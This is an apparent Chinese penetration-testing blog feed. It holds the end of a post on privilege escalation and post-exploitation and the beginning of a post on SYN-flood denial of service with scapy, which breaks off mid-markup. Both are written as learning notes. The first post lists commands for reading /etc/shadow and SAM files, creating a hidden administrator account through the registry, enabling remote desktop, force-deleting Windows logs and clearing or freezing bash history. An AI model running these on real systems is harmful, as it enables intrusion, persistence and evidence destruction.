src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BU：build user</span><br><span class="line">PU：power user</span><br><span class="line">BA：build administrator</span><br><span class="line"></span><br><span class="line">如果 BU 是 F 的话，则说明可以替换</span><br><span class="line">如果出现 FA；；；BU，则说明权限配置不当</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali 下使用 c 文件生成 winXP 下的可执行程序</span></span><br><span class="line">root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</span><br></pre></td></tr></table></figure><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">ls</span> -l</span><br><span class="line">find / -perm <span class="number">777</span> -<span class="keyword">exec</span> <span class="keyword">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 应用连接数据库的配置文件</span><br><span class="line"><span class="number">2.</span> 后台服务运行账号</span><br></pre></td></tr></table></figure><h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">•/etc/resolv.conf</span><br><span class="line">•/etc/passwd</span><br><span class="line">•/etc/shadow</span><br><span class="line">•whoami <span class="keyword">and</span> who –a</span><br><span class="line">•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r</span><br><span class="line">•uname –a, ps aux</span><br><span class="line">•dpkg -l| head</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r</span><br><span class="line">•net view , net view /domain    # 查共享信息</span><br><span class="line">•net<span class="built_in"> user </span>/domain, net<span class="built_in"> user </span>%username% /domain  # 查域信息</span><br><span class="line">•net accounts, net share</span><br><span class="line">•net localgroup administrators username /add</span><br><span class="line">•net<span class="built_in"> group </span><span class="string">"Domain Controllers"</span> /domain</span><br><span class="line">•net share name$=C:\ /unlimited    # 把 C盘共享出来</span><br><span class="line">•net<span class="built_in"> user </span>username /active:yes /domain  # 域管理员重新启动被锁定账号</span><br></pre></td></tr></table></figure><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\John&gt;wmic</span><br><span class="line">wmic:root\cli&gt;/?</span><br><span class="line">[global switches] &lt;command&gt;</span><br><span class="line"></span><br><span class="line">有效的全局开关有:</span><br><span class="line">/NAMESPACE           别名使用的名称空间路径。</span><br><span class="line">/ROLE                包含此别名定义的角色路径。</span><br><span class="line">/NODE                别名使用的服务器。</span><br><span class="line">/IMPLEVEL            客户模拟级别。</span><br><span class="line">/AUTHLEVEL           客户身份验证级别。</span><br><span class="line">/LOCALE              客户应用的语言识别符。</span><br><span class="line">/PRIVILEGES          启用或禁用所有特权。</span><br><span class="line">/TRACE               将调试信息输出到 stderr。</span><br><span class="line">/RECORD              将所有输入命令和输出写入日志。</span><br><span class="line">/INTERACTIVE         设置或重设交互模式。</span><br><span class="line">/FAILFAST            设置或重置 FailFast 模式。</span><br><span class="line"><span class="built_in">/USER </span>               会话期间使用的用户。</span><br><span class="line">/PASSWORD            用于会话登录的密码。</span><br><span class="line">/OUTPUT              为输出重新定向指定模式。</span><br><span class="line">/APPEND              为输出重新定向指定模式。</span><br><span class="line">/AGGREGATE           设置或重置集合模式。</span><br><span class="line">/AUTHORITY           Specifies the &lt;authority type&gt; <span class="keyword">for</span> the connection.</span><br><span class="line">/?[:&lt;BRIEF|FULL&gt;]    用法信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">•wmic nicconfig <span class="builtin-name">get</span> ipaddress,macaddress</span><br><span class="line">•wmic computersystem <span class="builtin-name">get</span> username</span><br><span class="line">•wmic netlogin <span class="builtin-name">get</span> name,lastlogon</span><br><span class="line">•wmic process <span class="builtin-name">get</span> caption, executablepath,commandline   # 提取软件安装信息</span><br><span class="line">•wmic process where <span class="attribute">name</span>=“calc.exe" call terminate  # 结束进程</span><br><span class="line">•wmic os <span class="builtin-name">get</span> name,servicepackmajorversion       #提取操作系统的补丁版本</span><br><span class="line">•wmic product <span class="builtin-name">get</span> name,version                  # 提取软件信息</span><br><span class="line">•wmic product where <span class="attribute">name</span>=“name” call uninstall /nointeractive   # 静默删除</span><br><span class="line">•wmic share <span class="builtin-name">get</span> /ALL                            # 提取共享文件夹</span><br><span class="line">•wmic /node:<span class="string">"machinename"</span> path Win32_TerminalServiceSetting where  <span class="attribute">AllowTSConnections</span>=<span class="string">"0"</span> call SetAllowTSConnections <span class="string">"1"</span>    # 开远程桌面</span><br><span class="line">•wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable   #查看日志目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable</span><br><span class="line">FileName   Path                       Writeable</span><br><span class="line">appevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntds       \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">dnsevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntfrs      \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">secevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">sysevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ThinPrint  \windows\system32\config\  <span class="literal">TRUE</span></span><br></pre></td></tr></table></figure><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">•/etc ；/usr/local/etc</span><br><span class="line">•/etc/passwd ；/etc/shadow</span><br><span class="line">•.ssh ；.gnupg 公私钥</span><br><span class="line">•The e-mail and data files</span><br><span class="line">•业务数据库 ；身份认证服务器数据库</span><br><span class="line">•/tmp</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">•SAM 数据库 ； 注册表文件</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\r</span>epair<span class="symbol">\S</span>AM</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\R</span>egBack<span class="symbol">\S</span>AM</span><br><span class="line">•业务数据库； 身份认证数据库</span><br><span class="line">•临时文件目录</span><br><span class="line">•UserProfile<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\T</span>emporary Internet Files\</span><br></pre></td></tr></table></figure><h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul><li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li><li>windows 系统</li></ul><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">•禁止在登陆界面显示新建账号</span><br><span class="line">•REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersio<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v uname /T REG_DWORD /D 0</span><br><span class="line">•del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br><span class="line">•History</span><br><span class="line">•日志</span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line">•其他日志和 HIDS 等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 控制系统之后，新建账号并添加管理员组</span><br><span class="line">C:<span class="symbol">\&gt;</span>net user user4 123456 /add</span><br><span class="line">命令成功完成。</span><br><span class="line">C:<span class="symbol">\&gt;</span>net localgroup administrators user4 /add</span><br><span class="line">命令成功完成。</span><br><span class="line"># 这样开机登录的界面会显示这个账户</span><br><span class="line"># 可以通过添加注册表来隐藏</span><br><span class="line">REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">C:<span class="symbol">\&gt;</span>REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">操作成功结束</span><br><span class="line"># 但是使用 net user 还是可以查看到这个账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 强制静默删除日志</span><br><span class="line">C:<span class="symbol">\&gt;</span>del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br></pre></td></tr></table></figure><ul><li>Linux 系统</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history</span></span><br><span class="line"><span class="comment"># history 记录保存在 .bash_history</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ls -l .bash_history </span></span><br><span class="line">    -rw------- <span class="number">1</span> root root <span class="number">15418 3</span>月   <span class="number">4 00</span><span class="symbol">:</span><span class="number">28</span> .bash_history</span><br><span class="line"><span class="comment"># 擦除痕迹</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># history -c</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr</span></span><br><span class="line">    --------------e---- ./Downloads</span><br><span class="line">    --------------e---- ./Desktop</span><br><span class="line">    --------------e---- ./testDir</span><br><span class="line">    --------------e---- ./Pictures</span><br><span class="line">    --------------e---- ./Public</span><br><span class="line">    --------------e---- ./vmware-tools-patches</span><br><span class="line">    --------------e---- ./Videos</span><br><span class="line">    --------------e---- ./Documents</span><br><span class="line">    --------------e---- ./Music</span><br><span class="line">    --------------e---- ./Templates</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr -h</span></span><br><span class="line">    <span class="symbol">Usage:</span> chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改文件属性让其无法被写入数据</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># touch 456.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    --------------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i 456.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lsattr 456.txt </span></span><br><span class="line">    ----i---------e---- <span class="number">456</span>.txt</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ifconfig &gt; 456.txt </span></span><br><span class="line">    -<span class="symbol">bash:</span> <span class="number">456</span>.<span class="symbol">txt:</span> 不允许的操作</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 .bash_history，让其无法被写入，会变成只读文件</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># chattr +i .bash_history</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志记录</span></span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/auth.log</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /var/log/wtmp</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># lastlog</span></span><br><span class="line">    用户名           端口     来自             最后登陆时间</span><br><span class="line">    root             pts/<span class="number">3</span>    <span class="number">172.16</span>.<span class="number">10.1</span>      日 <span class="number">3</span>月  <span class="number">4 02</span><span class="symbol">:</span><span class="number">30:00</span> -0500 <span class="number">2018</span></span><br><span class="line">    daemon                                     **从未登录过**</span><br><span class="line">    bin                                        **从未登录过**</span><br><span class="line">    sys                                        **从未登录过**</span><br><span class="line">    sync                                       **从未登录过**</span><br><span class="line">    games                                      **从未登录过**</span><br><span class="line">    man                                        **从未登录过**</span><br><span class="line">    lp                                         **从未登录过**</span><br><span class="line">    mail                                       **从未登录过**</span><br><span class="line">    news                                       **从未登录过**</span><br><span class="line">    uucp                                       **从未登录过**</span><br><span class="line">    proxy                                      **从未登录过**</span><br><span class="line">    www-data                                   **从未登录过**</span><br><span class="line">    backup                                     **从未登录过**</span><br><span class="line">    list                                       **从未登录过**</span><br><span class="line">    irc                                        **从未登录过**</span><br><span class="line">    gnats                                      **从未登录过**</span><br><span class="line">    nobody                                     **从未登录过**</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（一）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（一）&lt;/h2&gt;&lt;h3 id=&quot;windows提权
      
    
    </summary>
    
    
      <category term="渗透测试学习中常见提权方式总结（一）" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试——拒绝服务</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</id>
    <published>2020-04-03T11:58:09.000Z</published>
    <updated>2020-04-28T06:05:52.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拒绝服务常见的攻击方式总结"><a href="#拒绝服务常见的攻击方式总结" class="headerlink" title="拒绝服务常见的攻击方式总结"></a>拒绝服务常见的攻击方式总结</h2><h4 id="1-拒绝服务简介"><a href="#1-拒绝服务简介" class="headerlink" title="1.拒绝服务简介"></a>1.拒绝服务简介</h4><ul><li>Dos不是Ddos<ul><li>利用程序漏洞或一对一资源耗尽的Denial of service拒绝服务</li></ul></li><li>DDos分布式拒绝服务<ul><li>一对一的攻击完全拼各自的资源，效果差。</li><li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li></ul></li><li>历史<ul><li>以前：欠缺技术能力的无赖，我ping死你</li><li>现在：最强大最危险的攻击，攻击方式众多<ul><li>贩卖和租用肉鸡已经成为黑产种重要的一部分</li><li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费。</li></ul></li></ul></li></ul><h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2.DoS分类"></a>2.DoS分类</h4><ul><li>D网络<ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood、UDP Flood</li></ul></li><li>D协议<ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL </li></ul></li><li>D应用<ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用（CC）</li><li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li><li>可以是一击毙命的，也可以是耗尽目标资源的</li></ul></li></ul><h4 id="3-为何会被Dos"><a href="#3-为何会被Dos" class="headerlink" title="3.为何会被Dos"></a>3.为何会被Dos</h4><ul><li>从攻击者到被害者<ul><li>网络—&gt;FW（服务）—&gt;服务器OS—&gt;服务应用</li></ul></li><li>资源耗尽<ul><li>网络：带宽</li><li>FW:吞吐量、并发连接</li><li>服务器：CPU、内存、I/O</li><li>应用：处理请求能力，对OS资源的使用权</li></ul></li><li>程序漏洞攻击<ul><li>缓冲区溢出</li><li>协议、程序逻辑漏洞</li></ul></li><li>链路上任何一点都可成为目标</li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200320111906.png" alt=""></p><h3 id="拒绝服务——Syn-Flood攻击"><a href="#拒绝服务——Syn-Flood攻击" class="headerlink" title="拒绝服务——Syn-Flood攻击"></a>拒绝服务——Syn-Flood攻击</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>1.TCP连接和端口过程</p><p><strong>TCP建立连接</strong></p><p>第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p><p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p><p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p><p>未连接队列<br>在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。<br><strong>关闭TCP连接</strong></p><p>对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：</p><p>第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。</p><p>第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。</p><p>第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。</p><p>第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。</p><p>2.TCP 连接状态</p><p><img src="SW5S4jW.png" alt="img"></p><p>3.两个序号和三个标志位：</p><ul><li>序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</li><li>确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。</li><li>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：<ul><li>URG：紧急指针（urgent pointer）有效。</li><li>ACK：确认序号有效。</li><li>PSH：接收方应该尽快将这个报文交给应用层。</li><li>RST：重置连接。</li><li>SYN：发起一个新连接。</li><li>FIN：释放一个连接。</li></ul></li><li>需要注意的是：<ul><li>不要将确认序号ack与标志位中的ACK搞混了。</li><li>认方ack=发起方req+1，两端配对</li></ul></li></ul><p><img src="qoYhkJa.png" alt="img"><br>在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，</p><p>因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；</p><p>第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。</p><p><strong>4.四次挥手</strong></p><ul><li>由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，</li><li>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN</li><li>首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。<ul><li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态</li><li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li><li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li><li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li></ul></li></ul><h4 id="1-scapy构造数据包"><a href="#1-scapy构造数据包" class="headerlink" title="1.scapy构造数据包"></a>1.scapy构造数据包</h4><h5 id="1-构造-IP-数据包"><a href="#1-构造-IP-数据包" class="headerlink" title="1. 构造 IP 数据包"></a><strong>1. 构造 IP 数据包</strong></h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="E3mSTtG.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.132"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure><p><img src="KO66HGs.png" alt="img"></p><h5 id="2-构造TCP数据包"><a href="#2-构造TCP数据包" class="headerlink" title="2.构造TCP数据包"></a>2.构造TCP数据包</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; t=TCP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.display()</span><br></pre></td></tr></table></figure><p><img src="DCJyqt6.png" alt="img"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.dport=<span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.display()</span><br></pre></td></tr></table></figure><p><img src="y3zVkjb.png" alt="img"></p><h5 id="3-发送数据包需要构造成-IP-TCP-形式：i-t"><a href="#3-发送数据包需要构造成-IP-TCP-形式：i-t" class="headerlink" title="3. 发送数据包需要构造成 IP()/TCP() 形式：i/t"></a><strong>3. 发送数据包需要构造成 IP()/TCP() 形式：i/t</strong></h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sr1(i/t,verbose=<span class="number">1</span>,timeout=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="WNZ7i9P.png" alt="img"></p><h5 id="4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："><a href="#4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：" class="headerlink" title="4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："></a><strong>4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：</strong></h5><figure class="highlight angelscript"><table><tr><td 